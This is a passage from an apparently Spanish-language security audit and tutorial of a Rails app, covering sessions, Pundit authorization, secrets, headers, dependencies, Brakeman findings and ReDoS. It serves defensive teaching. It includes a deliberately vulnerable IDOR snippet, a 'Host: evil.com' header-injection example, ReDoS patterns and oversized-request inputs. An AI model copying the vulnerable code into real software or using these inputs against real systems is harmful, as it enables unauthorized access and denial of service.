   verifiqué en consola: 182 caracteres, base64 de un JSON firmado.
   `find_by_password_reset_token!` levanta
   `ActiveSupport::MessageVerifier::InvalidSignature` si está adulterado —
   que el controller rescata en `passwords_controller.rb:32`.

**Comparación:** en Spring esto lo hacés con una tabla `password_reset_tokens`
(token UUID, user_id, expires_at, used_at) y un job que la limpia. Rails lo
resuelve **sin tabla** porque el token es autocontenido y firmado. Es el mismo
truco que un JWT, pero con el secreto de la app y sin exponer un formato
estándar que invite a parsearlo del lado del cliente.

Lo que este repo **sí** hace bien y mucha gente olvida
(`app/controllers/passwords_controller.rb:21`):

```ruby
if @user.update(params.permit(:password, :password_confirmation))
  @user.sessions.destroy_all      # ← revoca TODAS las sesiones activas
```

Si alguien te robó la cuenta y vos resetás la clave, sus sesiones tienen que
morir. Sin esa línea, el atacante sigue adentro con su cookie.

---

## 6. Sesiones

### 6.1 Firmadas vs encriptadas: la diferencia que se pregunta

Rails tiene dos "jars" de cookies sobre `secret_key_base`:

- `cookies.signed[:x]` → **firmada**: el valor es **legible** por cualquiera,
  pero no se puede modificar sin invalidar la firma (HMAC).
- `cookies.encrypted[:x]` → **encriptada y autenticada** (AES-256-GCM): el valor
  es opaco **y** no se puede modificar.

Lo demostré con las claves reales de esta app:

```text
FIRMADA    -> ImlkLWRlLXNlc2lvbi1zZWNyZXRvIg==--43a9106b42726d7ad75c1205bf3b4c18a81be33c
  legible  -> "id-de-sesion-secreto"        ← base64, cualquiera lo lee
ENCRIPTADA -> rXjez2qFUb6FzqLZT2cpTDTtzM7Jrg==--FRxADbO/ecuRF924--BamgkyVSZ/llXT/Zt4Z0Eg==
```

**La regla:** firmada si el contenido no es secreto (un id), encriptada si lo es.

Este repo usa **firmada** para el session id
(`app/controllers/concerns/authentication.rb:44`), y está bien: el valor es el
`id` de la fila en `sessions`, un bigint. Que el usuario vea "soy la sesión 42"
no le sirve de nada, porque no puede fabricar la firma para la 43.

⚠️ **Pero ojo con la lección general:** un id secuencial *firmado* es seguro
sólo mientras la firma esté intacta. Si mañana alguien filtra `secret_key_base`,
un id secuencial es trivialmente forjable (probás del 1 al 100.000). Con un
token aleatorio de 256 bits en la tabla, ni con la clave filtrada podés adivinar
sesiones ajenas. Es defensa en profundidad barata, y es lo que hace
`ApiToken` (`app/models/api_token.rb:23`, `TOKEN_BYTES = 32`).

### 6.2 `secret_key_base`

Es la raíz de **todo** el material criptográfico de Rails: cookies firmadas,
cookies encriptadas, `MessageVerifier`, `generates_token_for`, Active Record
Encryption. Todo deriva de ahí vía `ActiveSupport::KeyGenerator` (PBKDF2 con
un "salt" que es un string constante distinto por propósito: `"signed cookie"`,
`"authenticated encrypted cookie"`, etc.).

En este repo:

```ruby
Rails.application.secret_key_base.length          # => 128
Rails.application.credentials.config.keys         # => [:secret_key_base]
```

O sea, vive en `config/credentials.yml.enc`, encriptado con `config/master.key`.

**Si se filtra `secret_key_base`, un atacante puede:**
- firmar cualquier cookie de sesión → suplantar a cualquier usuario
- forjar tokens de reset de contraseña válidos para cualquier cuenta
- desencriptar cualquier cookie encriptada

Es una **rotación de emergencia**, no un "lo cambiamos el mes que viene".
Rails soporta rotación con `config.action_dispatch.cookies_rotations` /
`ActiveSupport::MessageVerifier` con `rotate`, para no desloguear a todo el
mundo de golpe.

### 6.3 Flags de la cookie — auditoría real de este repo

```ruby
cookies.signed.permanent[:session_id] = {
  value: session.id, httponly: true, same_site: :lax
}
```

| Flag | Estado | Comentario |
|---|---|---|
| `httponly: true` | ✅ | JS no la lee; un XSS no roba la sesión |
| `same_site: :lax` | ✅ | mitiga CSRF a nivel browser |
| `secure: true` | ❌ **falta** | la cookie viaja por HTTP plano si alguien fuerza `http://` |
| expiración | ⚠️ `permanent` = **20 años** | ver abajo |

`secure` no está seteado explícitamente. Rails lo pone solo **si tenés
`config.force_ssl = true`** (el middleware `ActionDispatch::SSL` reescribe las
cookies con `secure`). Y en este repo `force_ssl` **está comentado**
(`config/environments/production.rb:31`, confirmado en runtime:
`config.force_ssl # => false`). O sea: hoy, en producción, la cookie de sesión
saldría sin `secure`.

Arreglo (los dos, no uno):

```ruby
# config/environments/production.rb
config.assume_ssl = true   # el proxy termina TLS y habla HTTP con Puma
config.force_ssl  = true   # redirect 301 a https + HSTS + cookies secure
```

### 6.4 Expiración: el bug real de este repo

`app/models/session.rb` define todo lo necesario:

```ruby
DEFAULT_TTL = 30.days
before_create { self.expires_at ||= DEFAULT_TTL.from_now }
scope :active, -> { where(expires_at: Time.current..) }
def expired? = expires_at.present? && expires_at <= Time.current
```

Pero `app/controllers/concerns/authentication.rb:28` hace:

```ruby
def find_session_by_cookie
  Session.find_by(id: cookies.signed[:session_id]) if cookies.signed[:session_id]
end
```

**`find_by`, no `active.find_by`.** El `expires_at` nunca se chequea al retomar
la sesión. Lo verifiqué creando una sesión vencida hace 10 días:

```text
session id=6 expires_at=2026-08-20 expired?=true
Session.find_by(id:)         -> true    ← lo que hace find_session_by_cookie
Session.active.find_by(id:)  -> false   ← el scope que existe pero no se usa
```

Y como la cookie es `permanent` (20 años), el vencimiento tampoco lo aplica el
browser. La única cosa que hoy termina una sesión vieja es el job nocturno
`Cleanup::ExpiredRecordsJob` (`app/jobs/cleanup/expired_records_job.rb:31`),
que borra `Session.where(expires_at: ...Time.current)` — o sea, la sesión sigue
viva hasta las 4 AM del día siguiente al vencimiento.

El arreglo es de una línea:

```ruby
def find_session_by_cookie
  return unless (id = cookies.signed[:session_id])
  Session.active.find_by(id: id)
end
```

Y ya que estás, **rolling expiration** (renovar mientras se usa) y
**absolute timeout** (matar a los N días pase lo que pase) son dos políticas
distintas; las apps serias implementan las dos.

### 6.5 Fijación de sesión

El ataque: el atacante fija un id de sesión conocido en el browser de la víctima
(vía XSS, un link `?_session_id=...`, o un subdominio), la víctima se loguea, y
la sesión ahora autenticada **es la que el atacante ya conocía**.

**Dónde se rompe la analogía con Java:** en Tomcat/Spring, la contramedida es
`sessionFixation().migrateSession()` — al autenticar, el contenedor genera un
`JSESSIONID` nuevo y copia los atributos. Es un problema real porque el
`JSESSIONID` lo genera el servidor **antes** del login y persiste después.

En Rails con `CookieStore`, **no hay un id de sesión del lado del servidor que
fijar**: la sesión *es* la cookie, y su contenido (firmado+encriptado) cambia
en cada escritura. La fijación clásica no aplica igual.

Pero el patrón defensivo sigue valiendo, y este repo **no lo hace**:

```ruby
def start_new_session_for(user)
  reset_session          # ← RECOMENDADO, hoy falta
  user.sessions.create!(...)
end
```

`reset_session` descarta todo el contenido de la sesión previa. Sin eso,
cualquier cosa que un anónimo haya puesto en `session[...]` sobrevive al login.
Concretamente acá: `session[:return_to_after_authenticating]`
(`authentication.rb:33`) sobrevive el login. Como se guarda `request.url` — una
URL **de esta app**, generada por el propio server — no es un open redirect
(§13.1). Pero el hábito correcto es `reset_session` al cambiar de identidad,
siempre: al loguear, al desloguear, y al cambiar de usuario.

### 6.6 Revocación

Este es el punto donde la arquitectura de este repo gana contra un JWT, y es
buena respuesta de entrevista.

Como la sesión es **una fila en `sessions`**, revocarla es un `DELETE`:

```ruby
Current.session.destroy              # logout (authentication.rb:49)
user.sessions.destroy_all            # "cerrar sesión en todos los dispositivos"
                                     # y también en el reset de password
```

Con un JWT stateless no podés hacer esto: el token es válido hasta que expira,
punto. Necesitás una blocklist en Redis... que es exactamente volver a tener
estado del lado del servidor, pero peor (dos fuentes de verdad).

La tabla además guarda `ip_address` y `user_agent`
(`db/schema.rb:184-193`), que es lo que te permite una pantalla de "sesiones
activas" tipo GitHub. Costo: un `SELECT` por request. Con el índice de PK, es
gratis comparado con el resto de la request.

Lo mismo aplica a la API: `ApiToken#revoke!` (`app/models/api_token.rb`) y el
scope `active` que excluye revocados y vencidos.

---

## 7. Autorización: Pundit, deny-by-default e IDOR

### 7.1 Por qué policies y no `if current_user.admin?`

`app/policies/application_policy.rb` es el patrón Strategy: una clase por
recurso, un método por acción. Es el análogo estructural de un
`AccessDecisionVoter` de Spring Security, pero explícito y testeable sin
levantar un contexto.

La diferencia con `@PreAuthorize("hasRole('ADMIN')")`: la anotación de Spring la
aplica un proxy AOP **automáticamente**. Pundit no aplica nada solo — vos tenés
que llamar `authorize`. Ese es el trade-off central: más control y más
testeabilidad, a cambio de que **olvidarte es posible**.

### 7.2 Deny by default

`app/policies/application_policy.rb:42-45`:

```ruby
def viewer?   = user&.active? && user.at_least?("viewer")
def operator? = user&.active? && user.at_least?("operator")
def manager?  = user&.active? && user.at_least?("manager")
def admin?    = user&.active? && user.admin?
```

El `&.` es la clave: sin usuario (petición anónima) devuelve `nil` → falsy →
**denegado**. Y `user&.active?` significa que **un admin desactivado no puede
nada** — hay un test explícito para eso en
`spec/policies/policies_spec.rb:41`.

Y el `Scope` base, `app/policies/application_policy.rb:57`:

```ruby
class Scope
  def resolve = scope.none      # ← por defecto NO se ve NADA
end
```

Si te olvidás de definir `resolve` en una policy nueva, el listado sale vacío.
Falla **cerrado**. Un `scope.all` como default sería un agujero esperando.

### 7.3 `verify_authorized`: la red de seguridad

El agujero clásico: agregás un endpoint, te olvidás el chequeo de permisos, y
queda abierto para todo el mundo durante ocho meses hasta que alguien lo nota.

`app/controllers/api/v1/base_controller.rb:117`:

```ruby
after_action :verify_pundit_usage

def verify_pundit_usage
  action_name == "index" ? verify_policy_scoped : verify_authorized
rescue Pundit::AuthorizationNotPerformedError, Pundit::PolicyScopingNotPerformedError => e
  raise e if Rails.env.local?     # dev/test: EXPLOTA
  Rails.logger.error(event: "security.authorization_missing", ...)
end
```

Dos cosas finas acá:

1. **`index` verifica `policy_scope`, no `authorize`.** Son controles distintos:
   `authorize` protege *un* objeto, `policy_scope` filtra *la colección*.
   Autorizar el `show` no sirve de nada si el `index` te lista todo.
2. **El comentario del código explica por qué NO se usa `only: %i[index]`.**
   Desde Rails 7.1, un callback con `only:` apuntando a una acción que no existe
   en ese controller levanta `AbstractController::ActionNotFound` **al ejecutarse**.
   Como `ReportsController` y `StockOperationsController` heredan de esta base y
   no tienen `index`, un `only: %i[index]` acá rompería todas sus acciones.

   El detalle que hay que agregar: ese `raise` está detrás de
   `config.action_controller.raise_on_missing_callback_actions`
   (`actionpack-8.1.3.1/lib/abstract_controller/callbacks.rb:47-64`), que Rails
   activa **sólo en development y test** — acá,
   `config/environments/development.rb:79` y `config/environments/test.rb:64`.
   En producción no levanta nada: el callback simplemente no matchea y la acción
   corre **sin verificar autorización**. O sea que el bug se vería en dev como
   una excepción ruidosa y en producción como un endpoint sin control de acceso.
   Peor combinación imposible, y es la razón por la que el callback único que
   decide adentro es la forma correcta.

Cuando una acción legítimamente no necesita autorizar, se declara explícito:
`skip_authorization` / `skip_policy_scope`
(`app/controllers/api/v1/reports_controller.rb`,
`app/controllers/stock_items_controller.rb:14`). Eso es distinto de olvidarse:
queda escrito y se ve en el diff.

⚠️ **Faltante real:** `ApplicationController` (la UI web) **no tiene**
`verify_authorized`. Sólo lo tiene el `BaseController` de la API. Un controller
HTML nuevo sin `authorize` no dispara ninguna alarma.

### 7.4 IDOR y `policy_scope`

**IDOR** (Insecure Direct Object Reference) es: el endpoint autentica pero no
autoriza *sobre ese objeto concreto*, y cambiando el id ves lo ajeno.

```ruby
# ❌ IDOR: autenticado sí, pero cualquiera lee cualquier orden
def show
  @order = PurchaseOrder.find(params[:id])
end
```

Las dos defensas, y **hacen falta las dos**:

```ruby
# a) authorize: pregunta "¿este usuario puede ver ESTE objeto?"
def show
  @order = PurchaseOrder.find(params[:id])
  authorize @order                                # → 403 si no
end

# b) policy_scope: la búsqueda arranca de lo que el usuario PUEDE ver
def show
  @order = policy_scope(PurchaseOrder).find(params[:id])   # → 404 si no
end
```

La (b) es **estructuralmente superior** por dos motivos: devuelve 404 en vez de
403 (un 403 confirma que el recurso existe — filtración de información), y si
te olvidás una condición, el objeto simplemente no aparece.

En este repo hay ejemplos de las dos formas:

```ruby
# app/controllers/stock_items_controller.rb:7  → colección filtrada
scope = policy_scope(StockItem).with_associations

# app/controllers/stock_items_controller.rb:52 → objeto SIN scope
def set_stock_item = @stock_item = StockItem.with_associations.find(params[:id])
# ...y después, en cada acción:
authorize @stock_item, :adjust?     # línea 42
```

Hoy eso es correcto **porque `StockItemPolicy::Scope#resolve` devuelve
`scope.all` para cualquier usuario activo**: en esta app no hay multi-tenancy,
todos los operadores ven todos los depósitos. Pero es exactamente el punto donde
se rompe: el día que agreguen `warehouse_id` por usuario o `company_id`,
`StockItem.find(params[:id])` pasa de correcto a IDOR **sin que cambie una sola
línea del controller**. Por eso, en una app con tenants, la forma canónica es
siempre:

```ruby
def set_stock_item = @stock_item = policy_scope(StockItem).find(params[:id])
```

El repo mitiga el vector más común de otra forma: la UI y la API usan **claves
naturales**, no ids secuenciales
(`app/controllers/products_controller.rb:69`,
`app/controllers/warehouses_controller.rb:53`):

```ruby
def set_product = @product = Product.find_by!(sku: params[:id].to_s.upcase)
```

`/products/TOR-001` no te dice cuántos productos hay ni te deja recorrer
`/products/1..99999`. **Eso no es autorización** — es reducción de superficie de
enumeración. No lo confundas ni lo vendas como control de acceso en una
entrevista.

### 7.5 Escalada de privilegios vía update del rol

Ya lo vimos en §4. Las dos mitades del arreglo:

```ruby
# app/policies/user_policy.rb:12
def change_role? = admin? && record != user
```

```ruby
# app/policies/user_policy.rb:14-20 — el Scope
class Scope < ApplicationPolicy::Scope
  def resolve
    return scope.none unless user&.active?
    user.admin? ? scope.all : scope.where(id: user.id)
  end
end
```

Un no-admin sólo se ve a sí mismo en cualquier listado de usuarios. Y ni un
admin puede cambiarse el rol a sí mismo (evita que un admin comprometido se
"baje" para esconderse, y evita el clásico "me saqué el admin sin querer y ahora
nadie puede arreglarlo").

Hay tests de matriz rol×acción en `spec/policies/policies_spec.rb`, que es la
forma correcta de documentar una política de acceso: falla apenas alguien afloja
un permiso sin querer.

---

## 8. Secretos

### 8.1 Credentials encriptadas

Rails guarda secretos en `config/credentials.yml.enc` (AES-128-GCM), y la clave
en `config/master.key`. **El `.enc` se commitea, la `.key` NUNCA.**

Auditoría real de este repo:

```bash
$ git ls-files | grep -E "master.key|credentials"
config/credentials.yml.enc          # ✅ sólo el encriptado
```

`.gitignore` línea 34: `/config/*.key`. ✅

En producción la clave llega por `RAILS_MASTER_KEY` (así lo documenta el
`Dockerfile:6`), nunca por archivo en la imagen.

`Dockerfile:55` tiene el detalle que a todos les falta:

```dockerfile
RUN SECRET_KEY_BASE_DUMMY=1 ./bin/rails assets:precompile
```

`SECRET_KEY_BASE_DUMMY` hace que Rails genere un `secret_key_base` descartable
sólo para bootear y compilar assets. Así **el build de la imagen no necesita la
master key** — y por lo tanto la clave no queda en una capa de Docker ni en los
logs de CI. Es un detalle chico que evita una filtración clásica.

### 8.2 Credentials vs variables de entorno

| | Credentials (`.yml.enc`) | Variables de entorno |
|---|---|---|
| Versionado | ✅ con el código, auditable en git | ❌ estado separado |
| Rotación | requiere deploy | inmediata (reinicio) |
| Por entorno | `credentials/production.yml.enc` | natural |
| Visible en `ps`/`/proc` | ❌ no | ⚠️ sí |
| Se filtra en un error report | ❌ no | ⚠️ sí, si dumpean `ENV` |
| Terceros (Vault, AWS SM) | ❌ no integra | ✅ natural |

Este repo usa **las dos**, y el criterio es correcto:

- **Credentials**: `secret_key_base` (lo único que hay hoy). Es el secreto raíz,
  cambia poco, tiene que estar disponible al bootear.
- **ENV**: `DATABASE_URL`, `REDIS_URL`, `OUTBOX_WEBHOOK_SECRET`,
  `SEED_ADMIN_PASSWORD` (ver `.env.example`). Cambia por entorno y lo inyecta el
  orquestador.

`.env` está en `.gitignore` (líneas 11 y 38-40) y sólo se commitea
`.env.example` con valores falsos. `dotenv-rails` está en el grupo
`:development, :test` del `Gemfile`, así que **en producción no se carga**: las
variables tienen que venir del entorno real. Eso es 12-factor bien hecho.

### 8.3 Qué NO commitear, nunca

- `config/master.key`, `config/*.key`, `config/credentials/*.key`
- `.env`, `.env.production`
- claves privadas (`*.pem`, `*.p12`), keytabs, service-account JSON de GCP
- dumps de base con datos reales
- `Gemfile.lock` **sí** se commitea (no es un secreto, es un lockfile — y es
  obligatorio para builds reproducibles)

Si ya lo commiteaste: **`git rm --cached` no alcanza**. El objeto sigue en la
historia y en todos los clones. El secreto está **quemado**: rotalo. Después,
limpiá la historia con `git filter-repo` (o BFG) y forzá el push. En ese orden:
primero rotar, después limpiar.

Herramientas para que no pase: `gitleaks` o `trufflehog` como pre-commit hook,
y GitHub Secret Scanning (gratis en repos públicos).

### 8.4 `filter_parameters`: qué NO llega a los logs

`config/initializers/filter_parameter_logging.rb:6`:

```ruby
Rails.application.config.filter_parameters += [
  :passw, :email, :secret, :token, :_key, :crypt, :salt, :certificate, :otp, :ssn, :cvv, :cvc
]
```

El matcheo es **por substring**, no exacto. `:passw` cubre `password`,
`password_confirmation`, `user_password`. Lo verifiqué con el filtro real de
esta app:

```ruby
{"password"=>"[FILTERED]",
 "email_address"=>"[FILTERED]",
 "api_token"=>"[FILTERED]",
 "user"=>{"password_confirmation"=>"[FILTERED]", "name"=>"Ana"},
 "quantity"=>10,
 "reason"=>"conteo"}
```

Fijate que filtra **recursivamente** dentro de hashes anidados, y que `:email`
(agregado por este repo, no viene por default) filtra `email_address` — o sea,
se está tratando el email como dato personal, que es lo correcto bajo GDPR/PII.

⚠️ **Tres limitaciones que hay que saber:**

1. Filtra los **parámetros** del request. **No** filtra lo que vos escribís a
   mano en el log. `Rails.logger.info("token=#{token}")` sale en claro.
2. **No** filtra headers. Si logueás `request.headers`, el
   `Authorization: Bearer stk_...` sale entero. Para eso hay que configurar
   `config.filter_redirect` y, para los headers, filtrarlos explícitamente en
   tu formatter o en el APM (Datadog/Sentry tienen su propia lista, y hay que
   configurarla aparte).
3. **No** filtra el body de una excepción. Un `RecordInvalid` puede llevar el
   valor rechazado en el mensaje.

Este repo lo mitiga bien en dos lugares:

- `app/controllers/concerns/api/error_handling.rb:113` — el error 500 loguea el
  detalle y al cliente le manda **sólo un `request_id`**. Nunca `e.message`.
  Los mensajes de Postgres filtran nombres de tabla, columna y a veces datos.
- `config/environments/production.rb:80` — `attributes_for_inspect = [:id]`.
  Sin eso, un `user.inspect` en un log o en un error report dumpea **todas** las
  columnas: `password_digest`, `email_address`, todo.
- `config/initializers/rack_attack.rb` — el throttle de la API hashea el token
  antes de usarlo como clave del cache (`Digest::SHA256.hexdigest`), porque las
  claves de Redis se ven en dashboards, en `MONITOR` y en logs.

---

## 9. Cabeceras de seguridad

Rails 8 pone cinco por defecto. Lo confirmé en runtime
(`ActionDispatch::Response.default_headers`):

```ruby
{"X-Frame-Options"                    => "SAMEORIGIN",
 "X-XSS-Protection"                   => "0",
 "X-Content-Type-Options"             => "nosniff",
 "X-Permitted-Cross-Domain-Policies"  => "none",
 "Referrer-Policy"                    => "strict-origin-when-cross-origin"}
```

| Cabecera | Qué evita | Estado acá |
|---|---|---|
| `X-Frame-Options: SAMEORIGIN` | clickjacking (tu app dentro de un `<iframe>` ajeno) | ✅ default |
| `X-Content-Type-Options: nosniff` | que el browser adivine el MIME y ejecute un "txt" como JS | ✅ default |
| `X-XSS-Protection: 0` | **apaga** el filtro XSS legacy de IE/Chrome, que era explotable | ✅ default (0 es lo correcto hoy) |
| `Referrer-Policy: strict-origin-when-cross-origin` | fugar la URL completa (con tokens en el path) al salir del sitio | ✅ default |
| `Strict-Transport-Security` | downgrade a HTTP / SSL stripping | ❌ **falta** (depende de `force_ssl`) |
| `Content-Security-Policy` | XSS, inyección de recursos | ❌ **falta** (§2.4) |

Las dos que faltan son la misma causa: `config.force_ssl` comentado en
`config/environments/production.rb:31`.

`force_ssl = true` inserta `ActionDispatch::SSL`, que hace **tres** cosas —
y esto se pregunta:

1. Redirige 301 todo `http://` a `https://`.
2. Manda `Strict-Transport-Security`. En runtime, `config.ssl_options` acá vale
   `{hsts: {subdomains: true}}` — pero **eso no lo configura este repo**: la
   línea `config.ssl_options` de `production.rb:34` está comentada, y el valor
   sale del default que pone `load_defaults` desde 5.0
   (`railties-8.1.3.1/lib/rails/application/configuration.rb:124`). No se aplica
   igual, porque el middleware no está montado.
3. Marca **todas** las cookies como `secure`.

Y `config.assume_ssl = true` es su complemento en arquitecturas con proxy: le
dice a Rails "el TLS lo terminó el balanceador, tratá esta request como segura
aunque te llegue por HTTP". Sin eso, con un proxy delante, `force_ssl` entra en
**loop de redirección infinita** — es el error más común al activarlo.

⚠️ **Cuidado con HSTS:** es una decisión **irreversible por `max-age`**. Si
mandás `max-age=31536000` y después necesitás servir por HTTP, los browsers que
ya lo cachearon **no te van a dejar** durante un año. Arrancá con
`max-age=300`, verificá, y recién ahí subilo.

`config.hosts` (línea 83, comentado) es la otra defensa que falta: protección
contra **DNS rebinding** y **Host header injection**. Sin allow-list de hosts, un
atacante manda `Host: evil.com`, y cualquier URL absoluta que genere la app
(un link en un mail de reset de contraseña, por ejemplo) apunta a su dominio.
En este repo `config.action_mailer.default_url_options = { host: "example.com" }`
(línea 61) está hardcodeado, así que el mail no es vulnerable — pero
`config.hosts` sigue siendo lo correcto.

---

## 10. Dependencias y supply chain

`Gemfile.lock` es el `pom.xml` resuelto, versionado y **autoritativo**. Se
commitea siempre. `bundle install` respeta el lock; `bundle update` lo mueve.

### 10.1 bundler-audit

Es el `OWASP dependency-check` de Ruby: compara `Gemfile.lock` contra la
[Ruby Advisory DB](https://github.com/rubysec/ruby-advisory-db).

Lo corrí en este repo:

```bash
$ bundle exec bundler-audit check --update
Updating ruby-advisory-db ...
ruby-advisory-db:
  advisories:   1237 advisories
  last updated: 2026-08-29 09:32:01 -0400
  commit:       c7562c2617416f453c366ffc976c804315365e33
No vulnerabilities found
```

**Cero vulnerabilidades** contra 1237 avisos. `config/bundler-audit.yml` tiene
la lista de CVEs ignorados, hoy con un placeholder
(`CVE-THAT-DOES-NOT-APPLY`). Esa lista es **deuda de seguridad visible**: cada
entrada debería llevar el motivo y una fecha de revisión.

Corre en CI: `.github/workflows/ci.yml`, job `scan_ruby`, paso
`bin/bundler-audit`. Rompe el build.

### 10.2 Dependabot

`.github/dependabot.yml` monitorea dos ecosistemas, semanalmente, con hasta 10
PRs abiertos:

```yaml
- package-ecosystem: bundler        # gemas
- package-ecosystem: github-actions # ⚠️ el que todos olvidan
```

Que `github-actions` esté ahí es importante: una action de terceros corre con
los secretos del repo. Fijar `uses: foo/bar@v3` te ata a un tag **mutable** — el
autor puede reapuntarlo. Para actions de terceros, fijá el **SHA completo**.

Este repo usa `actions/checkout@v6`, `ruby/setup-ruby@v1`, `actions/cache@v4` y
`actions/upload-artifact@v4` — todas de organizaciones de primer nivel, riesgo
aceptable, pero es exactamente el trade-off que hay que poder nombrar.

También hay `bin/importmap audit` (job `scan_js`), que audita los paquetes JS
del importmap contra la base de npm. Importmaps evita npm en runtime, pero no te
exime de auditar el JS que servís.

### 10.3 Supply chain

Riesgos reales del ecosistema Ruby, en orden de probabilidad:

1. **Typosquatting**: `bcrpyt` en vez de `bcrypt`. RubyGems no tiene scoping tipo
   `@org/pkg` de npm, así que es más fácil.
2. **Cuenta de mantenedor comprometida** (`rest-client` 1.6.13, 2019: subieron
   una versión con un backdoor que exfiltraba variables de entorno). RubyGems
   soporta MFA obligatoria para los gems más descargados desde 2022.
3. **Gemas con extensiones C** que corren código arbitrario en `bundle install`.
   `pg` es una de ellas. Compilar en el build, no en el runtime.

Mitigaciones concretas:
- **Checksums en el lockfile**, que es el `--require-hashes` de pip: fijan el
  SHA-256 de cada gema, así que una versión republicada con otro contenido no
  instala. En Bundler 2.5 esto se pedía con `bundle lock --add-checksums`; ese
  flag **ya no existe** en el Bundler de este repo (4.0.9 — lo verifiqué en las
  opciones de `bundle lock`), porque ahora se escriben solos. Y de hecho ya
  están: `Gemfile.lock` tiene una sección `CHECKSUMS` (línea 530) con 180
  entradas `sha256`. Lo único que hay que hacer es no borrarla en un merge.
- Un mirror interno (Artifactory, Gemfury) con aprobación explícita.
- `bundle install --frozen` en CI: falla si `Gemfile` y `Gemfile.lock` divergen.

---

## 11. Análisis estático: Brakeman sobre este repo, de verdad

Brakeman es el análogo de SpotBugs + Find-Sec-Bugs, pero **específico de Rails**:
entiende rutas, controllers, vistas ERB, strong params y el data-flow de
`params[...]` hasta un `where` o un `<%= %>`.

Está en el `Gemfile` con `require: false` (no se carga en el proceso de la app) y
corre en CI (`.github/workflows/ci.yml`, `bin/brakeman --no-pager`).

### 11.1 La corrida por defecto

```bash
$ bundle exec brakeman -q --no-pager

Application Path: /home/user/stock
Rails Version: 8.1.3.1
Brakeman Version: 8.0.6
Duration: 1.246347296 seconds
Checks Run: BasicAuth, ..., YAMLParsing   (79 checks)

Controllers: 20   Models: 22   Templates: 34   Errors: 0
Security Warnings: 0

No warnings found
```

**Cero advertencias** con el set de checks por defecto, que en Brakeman 8.0.6
son **79** (los conté de la propia salida; con `-A` suben a 86). No hay
`config/brakeman.ignore` (lo verifiqué: el archivo no existe), así que no es
que estén silenciadas — genuinamente no hay hallazgos.

### 11.2 Con TODOS los checks opcionales (`-A`)

Acá aparece lo interesante. `-A` agrega checks de baja confianza y de
configuración que Brakeman no corre por defecto porque generan ruido:

```bash
$ bundle exec brakeman -q -A --no-pager
Security Warnings: 3

Missing Encryption: 1
Unscoped Find: 2
```

**Hallazgo 1 — Missing Encryption (confianza: High)**

```text
Check:   ForceSSL
Message: The application does not force use of HTTPS: `config.force_ssl` is not enabled
File:    config/environments/production.rb  Line: 1
```

**Verdadero positivo.** Es exactamente lo que vimos en §6.3 y §9: `force_ssl`
comentado en la línea 31 significa sin HSTS, sin redirect a HTTPS y **sin flag
`secure` en las cookies**. Es el hallazgo más importante de los tres y es un
one-liner.

**Hallazgos 2 y 3 — Unscoped Find (confianza: Weak)**

```text
Check: UnscopedFind
Code:  Session.find_by(:id => cookies.signed[:session_id])
File:  app/channels/application_cable/connection.rb:11
File:  app/controllers/concerns/authentication.rb:29
```

Brakeman marca "buscás por id sin scopear por usuario" — su heurística de IDOR.
Acá es un **falso positivo en cuanto al IDOR**: el id sale de una cookie
**firmada** con `secret_key_base`, no de `params`. Un atacante no puede
sustituirlo sin la clave.

**Pero el dedo está apoyado en el lugar correcto por otro motivo.** Como vimos
en §6.4, es `find_by` y no `active.find_by`, así que **una sesión vencida sigue
autenticando**. Brakeman lo marcó por la razón equivocada y encontró un bug real
igual. Eso es exactamente cómo se usa un analizador estático: no como oráculo,
sino como generador de preguntas.

Y `application_cable/connection.rb:11` hereda el mismo problema para WebSockets.

### 11.3 Qué detecta Brakeman y qué NO

| Detecta bien | No detecta |
|---|---|
| SQLi por interpolación en `where`/`order` | **lógica de autorización rota** (una policy que devuelve `true` de más) |
| XSS por `raw`/`html_safe` con datos de `params` | IDOR real en un modelo multi-tenant |
| Mass assignment sin `permit` | race conditions / TOCTOU |
| Open redirect (`redirect_to params[:x]`) | secretos hardcodeados fuera de patrones conocidos |
| `eval`, `send`, `constantize` con input | vulnerabilidades **en las gemas** (eso es bundler-audit) |
| Config faltante: sesión (`SessionSettings`), CSRF (`ForgerySetting`) por defecto; `force_ssl` **sólo con `-A`** | lógica de negocio (descuentos negativos, stock que se duplica) |
| Deserialización insegura (YAML, Marshal) | todo lo que dependa de datos en runtime |

**Cero warnings de Brakeman ≠ app segura.** Tres ejemplos concretos en este
mismo repo, y ninguno salió del análisis estático:

- el bug de expiración de sesión (§6.4) — Brakeman lo tocó de casualidad, con un
  `UnscopedFind` que apuntaba a otra cosa;
- la CSP ausente (§2.4) — no hay check para eso;
- el techo de paginación que no existe (§12.3) — `Pagy::DEFAULT[:max_limit]` es
  una opción inventada, así que `?limit=1000000` llega crudo al `LIMIT`.

Los tres son bugs de **configuración semántica**: la línea está escrita, se lee
bien, y no hace nada. Un analizador de AST no tiene forma de saber que
`max_limit` no es una clave que la gema lea.

**Comparación con Java:** SpotBugs analiza bytecode y es agnóstico del framework;
Brakeman analiza el AST de Ruby **con conocimiento de Rails**, así que entiende
que `params` es taint source y que `<%= %>` escapa. A cambio, no sirve para
nada fuera de Rails y tiene más falsos positivos (Ruby es dinámico; no hay
tipos que ayuden al análisis).

---

## 12. Denegación de servicio

### 12.1 ReDoS

Un regex con backtracking exponencial + un input adversarial = un core al 100%
por minutos. Los patrones peligrosos son la cuantificación anidada
(`(a+)+`, `(a|a)*`) y las alternancias que se solapan.

**Rails 8 lo mitiga globalmente.** `Regexp.timeout ||= 1` lo setea
`load_defaults "8.0"` (`railties-8.1.3.1/lib/rails/application/configuration.rb:342`).
Verificado en runtime de este repo:

```ruby
Regexp.timeout   # => 1.0
```

O sea: cualquier match que pase de 1 segundo levanta `Regexp::TimeoutError`.
Un ReDoS pasa de "el proceso se cuelga para siempre" a "una request falla".

Eso **no es una excusa** para escribir regexes malos: 1 segundo de CPU por
request sigue siendo un ataque efectivo si el atacante manda 50 requests. La
defensa real es escribir el regex bien y acotar el input **antes** de matchear:

```ruby
# app/models/user.rb
validates :email_address, format: { with: URI::MailTo::EMAIL_REGEXP }
```

`URI::MailTo::EMAIL_REGEXP` está anclado (`\A...\z` — lo confirmé mirando
`.source`) y no tiene cuantificación anidada. Lo probé con `"a"*60 + "!"` (el
input que mata a un regex de email mal escrito), mil iteraciones: **0,0001 ms
por match**. No hay backtracking: el ancla lo corta en el primer carácter que no
encaja.

`app/queries/products/search.rb:63` usa `@term.match?(/\A[A-Za-z0-9._-]{2,32}\z/)`:
anclado, clase de caracteres simple, cuantificador **acotado**. Imposible de
hacer explotar.

El comentario de `app/controllers/concerns/api/token_authentication.rb:64-69`
resuelve el parseo del header `Authorization` **sin regex**:

```ruby
header.start_with?("Bearer ") ? header.delete_prefix("Bearer ").strip.presence : nil
```

